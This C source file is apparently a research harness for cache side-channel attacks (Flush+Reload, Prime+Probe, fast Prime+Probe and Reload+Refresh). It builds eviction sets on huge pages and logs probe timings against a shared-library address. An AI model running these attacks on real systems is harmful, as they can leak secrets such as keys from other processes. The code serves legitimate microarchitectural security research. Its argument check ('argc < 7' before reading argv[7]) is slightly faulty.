#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sched.h>
#include <unistd.h>
#include <sys/wait.h>
#include <time.h>

#include "T.h"           /*Shared library*/
#include "cache_utils.h" /*Cache manipulation functions*/

/*For huge pages*/
#define FILE_NAME "/mnt/hugetlbfs/filehuge"
#define PROTECTION (PROT_READ | PROT_WRITE)
/* Only ia64 requires this */
#ifdef __ia64__
#define ADDR (void *)(0x8000000000000000UL)
#define FLAGS (MAP_SHARED | MAP_FIXED)
#else
#define ADDR (void *)(0x0UL)
#define FLAGS (MAP_SHARED)
#endif

#define TIME_LIMIT 190         /*Time for main memory access, must be calibrated*/
#define CLEAN_REFRESH_TIME 620 /*Time for refresh, must be calibrated*/
#define TIME_PRIME 650         /*Time for refresh, must be calibrated*/
#define NUM_CANDIDATES 3 * CACHE_SET_SIZE *CACHE_SLICES
#define RES_MEM (1UL * 1024 * 1024) * 4 * CACHE_SIZE

#define CLEAN_NOISE 1
#define WAIT_FIXED 0

int target_pos; //Should be the same in the sender
long int *base_address;
long int *target_address;
long int candidates_set[NUM_CANDIDATES];
long int filtered_set[NUM_CANDIDATES];
long int eviction_set[CACHE_SET_SIZE * CACHE_SLICES];
long int invariant_part[CACHE_SET_SIZE * CACHE_SLICES];
long int elements_set[CACHE_SET_SIZE];          // For R+R attacks
long int long_eviction_set[CACHE_SET_SIZE * 2]; // For fast P+P attacks

int fd;
FILE *out_fd;
uintptr_t phys_addr;
int slice, set;
int wait_time;
int max_run_time;
int S, C, D;

struct timespec request,remain;

int main(int argc, char **argv)
{
    int i;
    char file_name[40];
    //Just use first argument
    if (argc < 5)
    {
        printf("Expected target address (int), attack name (-fr,-pp,-rr) wait cycles and max run time\n");
        return -1;
    }
    else
    {
        target_pos = atoi(argv[1]);
        wait_time = atoi(argv[3]);
	max_run_time = atoi(argv[4]);
        if (!target_pos)
        {
            printf("Error with the target address \n");
            return -1;
        }
        target_address = (long int *)get_address_table(target_pos);
        //target_address = (long int *)get_address_quixote(target_pos);
        printf("Target address %lx \n",(long int) target_address);
    }
    if (strcmp(argv[2], "-fr") == 0)
    {
        printf("TEST FLUSH+RELOAD\n");
        snprintf(file_name, 40, "test_fr_%d_%d.txt",target_pos, wait_time);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        int t;
        unsigned long tim = timestamp();
        int cont = 0;
        /*Check deduplication*/
        while (cont < 20)
        {
            tim = timestamp();
            while (timestamp() < tim + wait_time)
                ;
            t = access_timed_flush(target_address);
            //t = access_timed_full_flush(target_address);
            if (t < (TIME_LIMIT - 50))
            {
                //printf("%i \n", t);
                cont++;
            }
        }
	clock_gettime(CLOCK_MONOTONIC, &request);
        clock_gettime(CLOCK_MONOTONIC, &remain);
        /*Carry the attack*/
        while (remain.tv_sec<(request.tv_sec+max_run_time+1))
        {
            t = access_timed_flush(target_address);
            //t = access_timed_full_flush(target_address);
            mfence();
            tim = timestamp();
#if WAIT_FIXED
            while (timestamp() < tim + wait_time)
                ;
#endif
            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
	    clock_gettime(CLOCK_MONOTONIC, &remain);
        }
        fclose(out_fd);
        return 0;
    }
    else if (!strcmp(argv[2], "-pp"))
    {
        printf("TEST PRIME+PROBE\n");
        snprintf(file_name, 40, "test_pp_%d_%d.txt",target_pos, wait_time);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        /*Reserve huge pages*/

        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
        if (fd < 0)
        {
            perror("Open failed");
            exit(1);
        }

        unsigned long reserved_size = RES_MEM;
        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
        if (base_address == NULL)
        {
            printf("error allocating\n");
            exit(1);
        }
        if (base_address == MAP_FAILED)
        {
            perror("mmap");
            unlink(FILE_NAME);
            exit(1);
        }

        /*Set generation*/
        int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
        store_invariant_part(eviction_set, invariant_part);
        profile_address(invariant_part, eviction_set, target_address, &set, &slice);
        printf("Set and Slice %i %i \n", set, slice);

        /*Create the eviction set that matches with the target*/
        generate_new_eviction_set(set, invariant_part, eviction_set);
        write_linked_list(eviction_set);
        long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];

        unsigned long tim = timestamp();
        int t;
        ///NO PROFILE FOR P+P
        while (1)
        {
            t = probe_one_set(prime_address);
            mfence();
            tim = timestamp();
#if WAIT_FIXED
            while (timestamp() < tim + wait_time)
                ;
#endif
            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
        }
        fclose(out_fd);
        /*Release huge pages*/
        close(fd);
        unlink(FILE_NAME);
        return 0;
    }
    else if (!strcmp(argv[2], "-fpp")) //For fast Prime+Probe test
    {
        if (argc < 7)
        {
            printf("Also expected S,C and D for fast Prime+Probe\n");
            return -1;
        }
        S = atoi(argv[5]);
        C = atoi(argv[6]);
        D = atoi(argv[7]);
        printf("TEST FAST PRIME+PROBE (Rowhammer.js)\n");
        snprintf(file_name, 40, "test_fpp_%d_%d.txt",target_pos, wait_time);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        /*Reserve huge pages*/

        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
        if (fd < 0)
        {
            perror("Open failed");
            exit(1);
        }

        unsigned long reserved_size = RES_MEM;
        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
        if (base_address == NULL)
        {
            printf("error allocating\n");
            exit(1);
        }
        if (base_address == MAP_FAILED)
        {
            perror("mmap");
            unlink(FILE_NAME);
            exit(1);
        }

        /*Set generation*/
        int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
        store_invariant_part(eviction_set, invariant_part);
        profile_address(invariant_part, eviction_set, target_address, &set, &slice);
        printf("Set and Slice %i %i \n", set, slice);

        /*Create the eviction set that matches with the target*/
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, set); //To increase the size of the eviction set
        generate_new_eviction_set(set, invariant_part, eviction_set);
        increase_eviction(candidates_set, NUM_CANDIDATES, eviction_set, long_eviction_set, slice, TIME_LIMIT);

        unsigned long tim = timestamp();
        int t;
        ///NO PROFILE FOR P+P
        while (1)
        {
            t = fast_prime(long_eviction_set, S, C, D);
            tim = timestamp();
#if WAIT_FIXED
            while (timestamp() < tim + wait_time)
                ;
#endif
            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
        }
        fclose(out_fd);
        /*Release huge pages*/
        close(fd);
        unlink(FILE_NAME);
        return 0;
    }
    else if (!strcmp(argv[2], "-rr"))
    {
        printf("TEST RELOAD+REFRESH\n");
        snprintf(file_name, 40, "test_rr_%d_%d.txt",target_pos,wait_time);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        /*Reserve huge pages*/

        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
        if (fd < 0)
        {
            perror("Open failed");
            exit(1);
        }

        unsigned long reserved_size = RES_MEM;
        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
        if (base_address == NULL)
        {
            printf("error allocating\n");
            exit(1);
        }
        if (base_address == MAP_FAILED)
        {
            perror("mmap");
            unlink(FILE_NAME);
            exit(1);
        }

        /*Set generation*/
        int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
        store_invariant_part(eviction_set, invariant_part);
        profile_address(invariant_part, eviction_set, target_address, &set, &slice);

        /*Create the eviction set that matches with the target*/
        generate_new_eviction_set(set, invariant_part, eviction_set);
        write_linked_list(eviction_set);
        get_elements_set_rr(elements_set, eviction_set, target_address, slice);
        long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];
        long int *first_el = (long int *)eviction_set[slice * CACHE_SET_SIZE];
        long int *conflict_address = (long int *)eviction_set[(slice + 1) * CACHE_SET_SIZE - 1];
        printf("Set and Slice %i %i \n", set, slice);
        int t, t1;
        unsigned long tim = timestamp();
        int cont = 0;
        while (cont < 20)
        {
            tim = timestamp();
            while (timestamp() < tim + wait_time)
                ;
            t = access_timed_flush(target_address);
            if (t < (TIME_LIMIT - 50))
            {
                cont++;
            }
        }
        /*Set affinity to current core to avoid variations*/
        /*int core = sched_getcpu();
        if (core < 0)
        {
            printf("Error getting the CPU \n");
            return -1;
        }
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(core, &mask);
        printf("Core %i \n",core);
        sched_setaffinity(0, sizeof(cpu_set_t), &mask);

        while (sched_getcpu() != core);*/

        /*Prepare the sets for the attack*/
        prepare_sets(elements_set, conflict_address, TIME_PRIME);
        /*Carry the attack*/
        while (1)
        {
            cont++;
            t = reload_step(target_address, conflict_address, first_el);
            lfence();
            t1 = refresh_step(&elements_set[0]);
            tim = timestamp();
#if WAIT_FIXED
            while (timestamp() < tim + wait_time)
                ;
#endif
#if CLEAN_NOISE
            if (t1 > CLEAN_REFRESH_TIME)
            {
                prepare_sets(elements_set, conflict_address, TIME_PRIME);
            }
#endif
            fprintf(out_fd, "%i %i %lu\n", t, t1, tim);
        }
        fclose(out_fd);
        /*Release huge pages*/
        close(fd);
        unlink(FILE_NAME);
        return 0;
    }
    else
    {
        printf("wrong argument \n");
        return -1;
    }
}
